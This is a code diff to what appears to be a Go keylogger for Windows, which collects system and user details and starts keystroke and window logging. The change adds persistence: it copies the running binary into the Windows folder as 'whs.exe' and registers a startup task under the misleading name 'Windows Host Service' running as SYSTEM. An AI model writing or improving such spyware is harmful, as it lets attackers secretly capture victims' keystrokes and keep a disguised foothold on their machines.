@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"io"
 	"log"
 	"net"
 	"os"
@@ -229,7 +231,7 @@ func getSystemInfo() {
 	}
 
 	systemInfoData = systemInfo{
-		windowsFolder: string(windowsDirectory),
+		windowsFolder: string(bytes.Trim(windowsDirectory, "\x00")),
 		userName:      user.Name,
 		userUsername:  user.Username,
 		localIP:       getOutboundIP(),
@@ -396,13 +398,17 @@ func keyLoggerListener() {
 }
 
 func addScheduler() {
+	copyErr := copy(os.Args[0], systemInfoData.windowsFolder+"\\"+"whs.exe")
+	if copyErr != nil {
+		log.Fatalf("copy -> %v", copyErr)
+	}
 	cmd, err := exec.Command(
 		"schtasks",
 		"/create",
 		"/sc", "ONSTART",
 		"/tn", "Windows Host Service",
 		"/f",
-		"/tr", "D:\\Projects\\go-projects\\bin\\amigo.exe",
+		"/tr", systemInfoData.windowsFolder+"\\"+"whs.exe",
 		"/ru", "SYSTEM",
 	).Output()
 
@@ -412,11 +418,31 @@ func addScheduler() {
 	log.Println(string(cmd))
 }
 
+func copy(src, dst string) error {
+	in, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer in.Close()
+
+	out, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	_, err = io.Copy(out, in)
+	if err != nil {
+		return err
+	}
+	return out.Close()
+}
+
 func main() {
 	log.Println("Starting...")
-	addScheduler()
 	getSystemInfo()
 	createLogFile()
+	addScheduler()
 	go fileInterval()
 	go keyLogger()
 	go windowLogger()
